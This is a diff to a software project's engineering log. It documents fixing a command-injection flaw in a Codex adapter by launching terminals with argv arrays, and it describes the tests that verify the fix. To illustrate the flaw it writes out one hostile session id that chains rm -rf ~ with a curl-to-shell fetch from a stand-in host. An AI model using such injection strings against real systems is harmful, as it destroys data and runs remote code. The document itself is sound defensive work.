@@ -127,7 +127,7 @@ Honest inventory of what was not exercised on this machine:
   adapter.
 - `openInTerminal()` and `openNewSession()` on macOS and Linux (Windows-only machine).
   **Widened and re-stated, WP-04.** Both now go through a table of ten emulators
-  (`src/adapters/claude-code/terminals.mjs`) instead of one `.command` file and four `-e`
+  (`src/core/terminals.mjs` since §94) instead of one `.command` file and four `-e`
   guesses. Every one of them is **implemented against the emulator's own documented CLI or
   scheme, and unit-tested**: `test/unit/terminals.test.mjs` asserts the exact argv array for
   all 21 (platform, emulator, launch form) pairs, and the pair list is checked against the
@@ -3702,20 +3702,22 @@ shared temp directory is a delete loop, and the OS clears it.
 
 ### Left for other owners
 
-- **`src/adapters/codex/adapter.mjs` still builds shell strings.** Its macOS path interpolates
-  the session id into an AppleScript `do script "cd \"…\" && codex resume <id>"`, and its Linux
-  path into `bash -lc "codex resume <id>"`. That is the exact form this module was written to
-  remove, and it is one `launchTerminal()` call from being fixed. It was left alone because
-  WP-04's package is the Claude Code adapter and WP-23 owns Codex — but it should not wait for
-  WP-23, and a hostile session id reaches a shell there today.
+- ~~**`src/adapters/codex/adapter.mjs` still builds shell strings.**~~ **Closed by §94.** Its
+  macOS path interpolated the session id into an AppleScript
+  `do script "cd \"…\" && codex resume <id>"`, and its Linux path into
+  `bash -lc "codex resume <id>"` — the exact form this module was written to remove, and a
+  hostile session id reached a shell there. It was one `launchTerminal()` call from being fixed,
+  and that is what it now is.
 - **No UI.** The `terminal` setting is reachable through `POST /api/settings` and nowhere else;
   `public/` is outside this package. A picker in the settings panel, populated from
   `terminalIds()` filtered to the running platform, is Product Engineering's.
-- **The module's home.** It lives under `src/adapters/claude-code/` because WP-04 said so, and
-  because the spawn discipline belongs beside the adapter that spawns. It is not
-  Claude-Code-specific, and both `src/cli/doctor.mjs` and `src/http/routes/settings.mjs` now
-  import it across that boundary. When a second adapter adopts it, it should move to
-  `src/core/terminals.mjs`. Architect's call.
+- **The module's home.** ~~It lives under `src/adapters/claude-code/`~~ **Moved by §94.** It was
+  under `src/adapters/claude-code/` because WP-04 said so, and because the spawn discipline
+  belongs beside the adapter that spawns. It is not Claude-Code-specific, and both
+  `src/cli/doctor.mjs` and `src/http/routes/settings.mjs` were importing it across that
+  boundary. The condition set here — "when a second adapter adopts it, it should move to
+  `src/core/terminals.mjs`" — was met by the Codex adapter, and it has. The old path remains as
+  a re-export so those two callers are unchanged.
 
 ## 92. WP-38 · The status line: what it counts, where it reads from, and the six decisions the package left open
 
@@ -3865,3 +3867,110 @@ the `--json` shape and its agreement with the printed rows, the no-daemon refusa
 an INVARIANT test that the CLI writes nothing to `state.json`, exactly one POST per action, a
 daemon refusal reported rather than retried, and the three `open` cases. 514 tests to 570 across
 both packages.
+
+## 94. Codex adapter — the last shell string in the tree, and the module that moved to meet it
+
+**Spec:** `08-PLAN-V2-100X.md` §1.1 rule 8 keeps runtime CLI knowledge inside its adapter;
+`07-AGENT-HANDOVERS.md` Agent Backend states the discipline that goes with it — "argv arrays only,
+never shell strings with interpolated user data". §91's "left for other owners" named the one place
+still breaking it and said it should not wait for WP-23.
+
+**The defect.** `src/adapters/codex/adapter.mjs`'s `openInTerminal()` built its command as a shell
+string on both POSIX platforms:
+
+```
+osascript -e 'tell application "Terminal" to do script "cd \"<cwd>\" && codex resume <id>"'
+gnome-terminal -- bash -lc "codex resume <id>"     (and the same for konsole, xterm and
+                                                    x-terminal-emulator)
+```
+
+The session id and the working directory were interpolated straight in. Both arrive in a request
+body — `POST /api/open` and `POST /api/resume` take `id`, and the cwd is read from the registry —
+so this is §28's failure with the target moved from the network to the id. The macOS path escaped
+`"` and `\` for the AppleScript literal and stopped there: `'`, `` ` ``, `$(` and `;` all survived
+that pass into a `do script`, which is a shell. The Linux path escaped nothing at all. An id of
+``x'; rm -rf ~ #$(id)`id` && curl evil|sh`` reached a shell that would have run it.
+
+**Shipped.** `openInTerminal()` is now the same three lines as the Claude Code adapter: name the
+command as an argv array, hand it to `launchTerminal()`.
+
+```js
+await launchTerminal({
+  command: codexResumeCommand(sessionId), // ['codex', 'resume', <id>]
+  cwd,
+  sessionId,
+  prefix: 'codex-resume',
+  pin: opts.terminal,
+});
+```
+
+Nothing in the file builds a string for a process any more. There is exactly one `spawn()` left in
+it — `spawn('codex', args, …)` in `runCodex`, which was already an argv array — and the two argv
+builders behind it (`codexExecArgs`, `codexResumeCommand`) are pure functions, exported so the
+array itself can be asserted rather than reasoned about.
+
+Codex sessions gain the whole of WP-04 by doing so: ten emulators instead of four, `$TERMINAL`,
+detection of the emulator DeckHQ is running inside, and the `terminal` setting — which the Codex
+adapter previously ignored, so a user who had pinned Ghostty got it for Claude Code sessions and
+`x-terminal-emulator` for Codex ones. That difference is gone.
+
+### The module moved
+
+§91 left the condition explicitly: "when a second adapter adopts it, it should move to
+`src/core/terminals.mjs`. Architect's call." The Codex adapter is that second adapter, so it has
+moved. It knows nothing about any runtime and imports only node builtins, so this does not invert
+`02-ARCHITECTURE.md` §2's layering the way `core/` reaching into `adapters/` would — and it closes
+the boundary crossing §91 flagged, where `src/cli/doctor.mjs` and `src/http/routes/settings.mjs`
+were importing out of the Claude Code adapter's directory.
+
+`src/adapters/claude-code/terminals.mjs` remains, as one line:
+`export * from '../../core/terminals.mjs'`. Those two callers are outside this package's scope, so
+they are untouched and still work; repointing them and deleting the shim is a one-line change for
+their owner. A test asserts the re-export carries every binding, identity by identity, so the shim
+cannot silently go stale.
+
+### Not fixed, and deliberately so
+
+1. **`openNewSession()` still runs `codex resume new`.** It delegates to
+   `openInTerminal('codex:new', cwd)`, so the literal argv is `['codex', 'resume', 'new']`. That is
+   almost certainly not how Codex starts a fresh session, and `opts.instructions` is still dropped
+   where the Claude Code adapter now carries it (§91 deviation 5). Both are behaviour, not the
+   shell-string defect this change is for, and neither can be checked without Codex on the machine.
+   WP-23's. The user's pinned emulator IS now forwarded, because the point of routing both adapters
+   through `launchTerminal()` is that they obey one setting.
+2. **The adapter remains unverified against real Codex.** §8 stands unchanged: Codex is not
+   installed on the reference machine, `available()` returns false, and every method degrades
+   rather than throwing. Nothing in this change was executed against Codex. What was proved is the
+   argv arrays, which is a different claim (§1.1 rule 11).
+3. **The Windows console row still joins its argv into a `cmd.exe` command line.**
+   `cmd /c start "" cmd /k <argv>` is WP-04's Windows form and is unchanged here, but `cmd.exe`
+   does not parse its command line the way `CreateProcess` argv quoting assumes: `&`, `|`, `^`, `<`
+   and `>` are its metacharacters and node's win32 argument quoting does not escape them. So on
+   Windows an id containing `&` remains a residual — for Claude Code exactly as much as for Codex.
+   It is the same exposure before and after this change, it belongs to the terminal table rather
+   than to either adapter, and rewriting the one launch form that has actually been run on real
+   machines was not worth folding into a security fix for a different bug. Named here so it is not
+   mistaken for covered.
+
+### Acceptance
+
+`test/unit/codex-terminal.test.mjs`, 29 tests, none of which start a process:
+
+- the two argv builders, asserted as exact arrays in both their forms;
+- `codex resume <id>` built through `buildLaunch` for all 19 (platform, emulator, launch form)
+  pairs, asserting no launch form names a shell and no argument is a `-c`/`-lc` flag;
+- `SECURITY:` the same hostile id `terminals.test.mjs` uses, over all 19 pairs — it lands in
+  exactly one argv element and is equal to it, or, for the three macOS applications that take no
+  argv at all, appears nowhere in the argv;
+- `SECURITY:` a hostile cwd reaches at most one argv element and is always its tail, never spliced
+  into the middle of one;
+- `SECURITY:` the `#!/bin/sh` wrapper written for those three applications, read back through the
+  grammar `sh` itself uses, recovers the exact argv — and the line matches the grammar of nothing
+  but single-quoted words, so every metacharacter is inside a quoted word by construction;
+- `SECURITY:` two scans of the adapter's own source with comments stripped — its code contains no
+  `bash`, `zsh`, `-lc`, `sh -c`, `osascript`, `do script`, `shell: true`, `cmd` or `start`
+  anywhere, and it launches exactly one process, with `spawn` and a named argv array;
+- the adapter surface on this Codex-free machine: `openInTerminal` with a hostile id and a pin
+  still resolves rather than throwing, `openNewSession` still reports a missing Codex.
+
+Plus one test in `terminals.test.mjs` for the re-export shim. 714 tests to 744.
